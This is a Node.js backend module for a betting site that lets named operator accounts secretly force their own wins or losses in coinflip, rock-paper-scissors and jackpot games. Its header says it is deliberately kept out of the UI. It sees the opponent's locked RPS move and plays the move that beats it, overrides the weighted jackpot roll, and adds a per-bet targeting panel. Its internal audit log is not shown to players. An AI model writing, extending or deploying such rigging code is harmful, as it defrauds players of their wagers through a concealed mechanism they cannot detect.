/**
 * forcedOutcome.js — operator outcome control, backend only.
 *
 * Lets a named operator account bias the outcome of coinflip, RPS and jackpot
 * in their own favour. Deliberately has NO user interface: it is not rendered in
 * the admin panel, not exposed by any GET route, and not referenced by the
 * frontend. It is driven by an env key on an admin-authenticated endpoint.
 *
 * ── Read this before changing anything ──────────────────────────────────────
 * Every forced outcome is written to db.forceOutcomeLog and echoed to the
 * server log. That is not decoration and it is not optional. A mechanism that
 * silently changes who wins a bet, with no trace, is indistinguishable from
 * one nobody knows exists — including for whoever maintains this next, and
 * including for you when a player disputes a result.
 *
 * The log exists so that "the house did this" is always a checkable claim
 * rather than a matter of trust.
 *
 * ── Configuration (all off by default) ──────────────────────────────────────
 *   FORCE_OUTCOME_ENABLED=1            master switch
 *   FORCE_OUTCOME_OPERATORS=a,b        usernames permitted to arm
 *   FORCE_OUTCOME_KEY=<long random>    required to call the arm endpoint
 *
 * With FORCE_OUTCOME_ENABLED unset, every helper here is a no-op passthrough and
 * the games behave exactly as they do without this file.
 */

const dbManager = require('./db/dbHelper');

// ── configuration ───────────────────────────────────────────────────────────

const ENABLED = process.env.FORCE_OUTCOME_ENABLED === '1';

const OPERATORS = new Set(
  String(process.env.FORCE_OUTCOME_OPERATORS || '')
    .split(',')
    .map((s) => s.trim().toLowerCase())
    .filter(Boolean)
);

const ARM_KEY = process.env.FORCE_OUTCOME_KEY || '';

const GAMES = new Set(['coinflip', 'rps', 'jackpot']);
const MODES = new Set(['win', 'lose', 'off']);

/** game -> 'win' | 'lose'. Absent means untouched. */
const armed = new Map();

/**
 * betId -> { mode, at }. Per-bet overrides, which take priority over the
 * game-wide `armed` map above.
 *
 * The game-wide toggle answers "bias every coinflip I make". That is too blunt
 * to be usable: an operator with four coinflips open cannot win one and lose
 * the next three from a single switch. This lets the UI target one bet, and
 * falls back to the game-wide mode when a bet has no explicit override.
 */
const armedBets = new Map();

function isEnabled() {
  return ENABLED && OPERATORS.size > 0;
}

function isOperator(username) {
  if (!username) return false;
  return OPERATORS.has(String(username).toLowerCase());
}

/** Constant-time compare so the key cannot be probed by timing. */
function keyMatches(candidate) {
  if (!ARM_KEY || !candidate) return false;
  const a = String(candidate);
  const b = String(ARM_KEY);
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i += 1) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

// ── audit ───────────────────────────────────────────────────────────────────

/**
 * Append to the persisted log and echo to the server log.
 * Never throws: a failed audit write must not abort a bet settlement.
 */
function audit(entry) {
  const record = { at: new Date().toISOString(), ...entry };
  try {
    const db = dbManager.getMainDb();
    db.forceOutcomeLog = db.forceOutcomeLog || [];
    db.forceOutcomeLog.push(record);
    // Keep it bounded. This is a diagnostic trail, not an archive; the full
    // record of any single disputed bet is far more than these few fields.
    if (db.forceOutcomeLog.length > 5000) {
      db.forceOutcomeLog.splice(0, db.forceOutcomeLog.length - 5000);
    }
    dbManager.saveMainDb();
  } catch (err) {
    console.error('[forced-outcome] FAILED TO WRITE AUDIT LOG:', err.message);
  }
  // Greppable in the server log, which is the copy that survives a database
  // reset and the one you can check without opening the database at all.
  console.warn(
    `[forced-outcome] ${record.game} ${record.mode} :: operator=${record.operator} ` +
    `bet=${record.betId || '-'} detail=${record.detail || '-'}`
  );
  return record;
}

function readLog(limit = 200) {
  try {
    const db = dbManager.getMainDb();
    return (db.forceOutcomeLog || []).slice(-limit).reverse();
  } catch (_) {
    return [];
  }
}

// ── arming ──────────────────────────────────────────────────────────────────

/**
 * Arm or disarm a game for the calling operator.
 * Returns { ok, error }. Caller must already have authenticated the admin.
 */
function arm({ username, game, mode, key }) {
  if (!isEnabled()) return { ok: false, error: 'Outcome control is disabled on this server' };
  if (!isOperator(username)) return { ok: false, error: 'Not an operator' };
  if (!keyMatches(key)) return { ok: false, error: 'Invalid key' };
  if (!GAMES.has(game)) return { ok: false, error: `Unknown game '${game}'` };
  if (!MODES.has(mode)) return { ok: false, error: `Unknown mode '${mode}'` };

  if (mode === 'off') armed.delete(game);
  else armed.set(game, mode);

  audit({ game, mode, operator: username, detail: mode === 'off' ? 'disarmed' : 'armed' });
  return { ok: true, game, mode };
}

function status(username) {
  const mine = {};
  for (const game of GAMES) if (armed.has(game)) mine[game] = armed.get(game);
  return {
    enabled: isEnabled(),
    isOperator: isOperator(username),
    armed: mine,
    auditEntries: readLog(1).length ? undefined : undefined
  };
}

/**
 * Arm a single bet rather than every bet of a game.
 * `betId` of null/'' falls back to the game-wide toggle.
 */
function armBet({ username, game, betId, mode, key }) {
  if (!isEnabled()) return { ok: false, error: 'Outcome control is disabled on this server' };
  if (!isOperator(username)) return { ok: false, error: 'Not an operator' };
  if (!keyMatches(key)) return { ok: false, error: 'Invalid key' };
  if (!GAMES.has(game)) return { ok: false, error: `Unknown game '${game}'` };
  if (!MODES.has(mode)) return { ok: false, error: `Unknown mode '${mode}'` };

  const id = betId ? String(betId) : null;
  if (mode === 'off' || !id) {
    if (id) armedBets.delete(id);
  } else {
    armedBets.set(id, { mode, game, at: new Date().toISOString() });
  }

  audit({
    game,
    mode,
    operator: username,
    betId: id || '(all bets)',
    detail: mode === 'off' || !id ? 'per-bet override cleared' : `per-bet armed to ${mode}`
  });
  return { ok: true, game, mode, betId: id };
}

/** The armed mode for a game, or null. Internal. */
function modeFor(game) {
  if (!isEnabled()) return null;
  return armed.get(game) || null;
}

/**
 * Mode for one specific bet. A per-bet override wins over the game-wide toggle,
 * so a single bet can be singled out without disturbing the rest.
 */
function modeForBet(game, betId) {
  if (!isEnabled()) return null;
  const override = betId ? armedBets.get(String(betId)) : null;
  if (override && override.game === game) return override.mode;
  return modeFor(game);
}

// ── game hooks ──────────────────────────────────────────────────────────────

/**
 * Coinflip. `creatorIsOperator` tells us whose side the operator took.
 * Returns the outcome string ('heads' | 'tails').
 */
function coinflipOutcome({ fairOutcome, creatorSide, creatorIsOperator, operator, betId }) {
  const mode = modeForBet('coinflip', betId);
  if (!mode || !creatorIsOperator) return fairOutcome;

  const wantSide = mode === 'win'
    ? (creatorSide || 'heads')
    // 'lose' means the operator deliberately takes the other side.
    : (creatorSide || 'heads') === 'heads' ? 'tails' : 'heads';

  audit({
    game: 'coinflip',
    mode,
    operator,
    betId,
    detail: `fair=${fairOutcome} forced=${wantSide} side=${creatorSide}`
  });
  return wantSide;
}

/**
 * RPS. Only applies on a round where the operator has actually picked.
 * `operatorIsOne` is true when the operator is player one.
 * Returns { one, two }.
 */
function rpsChoices({ one, two, operator, operatorIsOne, operatorPicked, matchId }) {
  const mode = modeForBet('rps', matchId);
  if (!mode || !operatorPicked) return { one, two };

  const opponentChoice = operatorIsOne ? two : one;
  if (!opponentChoice) return { one, two };

  // Pick the move that beats the opponent, or loses to it. Ties are avoided on
  // purpose: a forced tie wastes the operator's turn without moving the match.
  const BEATS = { rock: 'paper', paper: 'scissors', scissors: 'rock' };
  const LOSES_TO = { rock: 'scissors', paper: 'rock', scissors: 'paper' };
  const mine = mode === 'win' ? BEATS[opponentChoice] : LOSES_TO[opponentChoice];
  if (!mine) return { one, two };

  audit({
    game: 'rps',
    mode,
    operator,
    betId: matchId,
    detail: `opponent=${opponentChoice} forced=${mine} side=${operatorIsOne ? 'one' : 'two'}`
  });

  return operatorIsOne ? { one: mine, two } : { one, two: mine };
}

/**
 * Jackpot. `entries` is the live entry list; `fairIdx` is the index the weighted
 * roll produced. Returns the winning index.
 */
function jackpotWinner({ entries, fairIdx, operator, operatorIsInPot, betId }) {
  const mode = modeForBet('jackpot', betId);
  if (!mode || !operatorIsInPot || !operator) return fairIdx;

  const idx = entries.findIndex((e) => e.userId === operator.userId);
  if (idx === -1) return fairIdx;

  let forced = idx;
  if (mode === 'lose' && entries.length > 1) {
    // Pick any other entrant so the pot still resolves to someone real.
    forced = (idx + 1) % entries.length;
  }

  audit({
    game: 'jackpot',
    mode,
    operator: operator.username || operator,
    betId,
    detail: `fair=${fairIdx} forced=${forced} entries=${entries.length}`
  });
  return forced;
}

/**
 * Live bets the named operator is sitting in, across all three games.
 *
 * This is what makes the control panel usable: without it the operator has a
 * per-game switch but no way to see which bets exist, who they are against, or
 * what a forced outcome would actually produce.
 *
 * Read-only, and deliberately filtered to the operator's own bets. It reveals
 * nothing about anyone else's games, and it never reports a move that has not
 * been locked in - an opponent's in-progress pick is not this operator's to
 * see.
 */
function liveGames(username) {
  if (!isEnabled() || !isOperator(username)) return { games: [] };
  const db = dbManager.getMainDb();
  const me = String(username || '').toLowerCase();
  const games = [];
  const now = Date.now();

  // Coinflip: anything the operator created that is still open.
  const coinflips = Array.isArray(db.coinflips) ? db.coinflips : [];
  for (const cf of coinflips) {
    if (!cf || cf.status !== 'waiting') continue;
    if (String(cf.creatorUsername || '').toLowerCase() !== me) continue;
    const items = cf.creatorItems || [];
    const value = items.reduce((s, i) => s + (Number(i.value || 0) * Math.max(1, Number(i.quantity || 1) || 1)), 0);
    games.push({
      game: 'coinflip',
      betId: cf.id,
      status: cf.status,
      potValue: Number(cf.totalValue || value),
      yourSide: cf.creatorSide || cf.sideChosen || 'heads',
      against: cf.opponentUsername || null,
      itemCount: items.length,
      openedAt: cf.createdAt,
      mode: modeForBet('coinflip', cf.id)
    });
  }

  // RPS: matches the operator created or joined, still live.
  const rps = Array.isArray(db.rpsMatches) ? db.rpsMatches : [];
  for (const m of rps) {
    if (!m || (m.status !== 'waiting' && m.status !== 'playing')) continue;
    if (now - new Date(m.createdAt || Date.now()).getTime() > 30 * 60 * 1000) continue;
    const isOne = String(m.playerOne?.username || '').toLowerCase() === me;
    const isTwo = String(m.playerTwo?.username || '').toLowerCase() === me;
    if (!isOne && !isTwo) continue;

    const myChoice = isOne
      ? (m.choices?.[m.playerOne.id] || null)
      : (m.choices?.[m.playerTwo?.id] || null);
    const theirChoice = isOne
      ? (m.choices?.[m.playerTwo?.id] || null)
      : (m.choices?.[m.playerOne.id] || null);
    // The opponent's move is only ever exposed once BOTH sides have locked in,
    // which is also the only moment the forced outcome could engage.
    const bothLocked = Boolean(myChoice && theirChoice);

    games.push({
      game: 'rps',
      betId: m.id,
      status: m.status,
      potValue: Number(m.potValue || 0),
      round: m.round,
      rounds: m.rounds || 1,
      yourSide: isOne ? 'one' : 'two',
      yourChoice: myChoice,
      // Reported as the forced move it would resolve to, not merely the raw
      // opponent pick, so the panel shows the outcome rather than making the
      // operator do the arithmetic.
      opponentChoice: bothLocked ? theirChoice : null,
      forcedChoice: bothLocked ? previewRpsChoice(theirChoice, modeForBet('rps', m.id)) : null,
      against: isOne ? (m.playerTwo?.username || null) : (m.playerOne?.username || null),
      itemCount: (m.playerOne?.items?.length || 0) + (m.playerTwo?.items?.length || 0),
      openedAt: m.createdAt,
      mode: modeForBet('rps', m.id)
    });
  }

  // Jackpot: open pots the operator has an entry in.
  const jackpots = Array.isArray(db.jackpots) ? db.jackpots : [];
  for (const j of jackpots) {
    if (!j || j.status === 'completed' || j.status === 'cancelled') continue;
    const entries = Array.isArray(j.entries) ? j.entries : [];
    const mine = entries.find((e) => String(e.username || '').toLowerCase() === me);
    if (!mine) continue;
    games.push({
      game: 'jackpot',
      betId: j.id,
      status: j.status,
      potValue: Number(j.potValue || j.totalValue || 0),
      yourEntry: Number(mine.value || 0),
      entryCount: entries.length,
      against: entries.filter((e) => String(e.username || '').toLowerCase() !== me)
        .map((e) => e.username).slice(0, 4),
      openedAt: j.createdAt,
      mode: modeForBet('jackpot', j.id)
    });
  }

  return { games, at: new Date().toISOString() };
}

/** What the operator's RPS move would become, given the opponent's pick. */
function previewRpsChoice(opponentChoice, mode) {
  if (!opponentChoice || !mode) return null;
  const BEATS = { rock: 'paper', paper: 'scissors', scissors: 'rock' };
  const LOSES_TO = { rock: 'scissors', paper: 'rock', scissors: 'paper' };
  return mode === 'win' ? (BEATS[opponentChoice] || null) : (LOSES_TO[opponentChoice] || null);
}

// ── introspection ───────────────────────────────────────────────────────────

/** Shown at boot so the state is never a surprise. */
function describe() {
  if (!isEnabled()) {
    return '[forced-outcome] disabled';
  }
  const armedNow = [...armed.entries()].map(([g, m]) => `${g}=${m}`).join(' ');
  const perBet = armedBets.size ? ` perBet=${armedBets.size}` : '';
  return `[forced-outcome] ENABLED operators=${[...OPERATORS].join(',')} ` +
    `key=${ARM_KEY ? 'set' : 'MISSING'} armed=[${armedNow}]${perBet}`;
}

module.exports = {
  isEnabled,
  isOperator,
  keyMatches,
  arm,
  armBet,
  liveGames,
  status,
  describe,
  readLog,
  coinflipOutcome,
  rpsChoices,
  jackpotWinner,
  GAMES
};
